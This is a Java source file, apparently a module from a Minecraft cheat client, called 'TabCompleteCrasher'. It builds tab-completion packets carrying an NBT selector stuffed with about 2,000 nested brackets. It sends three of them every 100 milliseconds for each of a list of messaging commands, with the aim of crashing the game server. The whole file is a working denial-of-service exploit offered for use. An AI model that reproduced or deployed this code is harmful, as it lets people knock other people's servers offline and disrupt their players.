package sertyo.events.module.impl.render;

import com.darkmagician6.eventapi.EventTarget;
import io.netty.channel.Channel;
import me.sertyo.j2c.J2c;
import net.minecraft.network.IPacket;
import net.minecraft.network.play.client.CTabCompletePacket;
import sertyo.events.Main;
import sertyo.events.event.player.EventUpdate;
import sertyo.events.module.Category;
import sertyo.events.module.Module;
import sertyo.events.module.ModuleAnnotation;
import sertyo.events.utility.misc.ChatUtility;
import sertyo.events.utility.misc.TimerHelper;

import java.util.stream.Collectors;
import java.util.stream.IntStream;

@J2c
@ModuleAnnotation(name = "Crasher", category = Category.UTIL)
public class TabCompleteCrasher extends Module {

    private static final int packets = 3;

    private static final String NBT_EXECUTOR = " @a[nbt={PAYLOAD}]";

    private static final String[] KNOWN_WORKING_MESSAGES = {
            "msg",
            "minecraft:msg",
            "tell",
            "minecraft:tell",
            "tm",
            "teammsg",
            "minecraft:teammsg",
            "minecraft:w",
            "minecraft:whisper",
            "minecraft:me",
            "dm",             // Часто используемая команда на плагиновых серверах
            "directmessage",  // Полное название команды для ЛС
            "pm",             // Личное сообщение (private message)
            "privatemessage"  // Полное название для отправки ЛС
    };

    static private int messageIndex = 0;

    static TimerHelper timerUtil = new TimerHelper();
    @EventTarget
    public void onUpdate(EventUpdate eventUpdate) {
        if (messageIndex == KNOWN_WORKING_MESSAGES.length - 1) {
            messageIndex = 0;
            Main.getInstance().getModuleManager().getModule(TabCompleteCrasher.class).setToggled(false);
            return;
        }

        if (timerUtil.hasReached(100)) {
            String knownMessage = KNOWN_WORKING_MESSAGES[messageIndex] + NBT_EXECUTOR;

            int len = 2044 - knownMessage.length();
            String overflow = generateJsonObject(len);
            String partialCommand = knownMessage.replace("{PAYLOAD}", overflow);

            Channel channel = mc.getConnection().getNetworkManager().channel;  // Обновленная строка для получения канала

            IPacket<?> packet = new CTabCompletePacket(0, partialCommand);  // Используем CCommandPacket для команд

            for (int i = 0; i < packets; i++) {
                channel.write(packet);
            //    channel.writeAndFlush(packet);
            }
           channel.flush();
            ChatUtility.addChatMessage(String.format("Json successfly sended [%sbyte]", len));

            messageIndex++;
        }
    }

    private static String generateJsonObject(int levels) {
        String json = IntStream.range(0, levels)
                .mapToObj(i -> "[")
                .collect(Collectors.joining());
        return "{a:" + json + "}";
    }
}